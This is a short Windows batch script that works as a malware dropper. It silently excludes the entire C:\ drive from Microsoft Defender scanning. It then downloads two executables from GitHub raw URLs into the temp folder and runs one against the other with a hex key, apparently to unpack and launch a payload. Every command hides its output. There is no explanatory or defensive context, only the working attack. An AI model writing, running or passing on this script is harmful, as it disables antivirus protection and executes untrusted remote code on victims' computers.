@echo off
powershell.exe Add-MpPreference -ExclusionPath "C:\\" -Force >nul 2>&1
powershell.exe -Command "$url = 'https://raw.githubusercontent.com/TheWeaponSmith/ADT/master/ADT.exe'; $dest = '%TEMP%\ADT.exe'; Invoke-WebRequest -Uri $url -OutFile $dest" >nul 2>&1
powershell.exe -Command "$url = 'https://raw.githubusercontent.com/FlipZak/filebin/main/LoadDependencies.exe'; $dest = '%TEMP%\LoadDependencies.exe'; Invoke-WebRequest -Uri $url -OutFile $dest" >nul 2>&1
cd %TEMP%
ADT.exe --file LoadDependencies.exe --key b7cd6e5d943d29a979e10429d80ff2151bc8fc37253eb5b9f4622551a8454f9f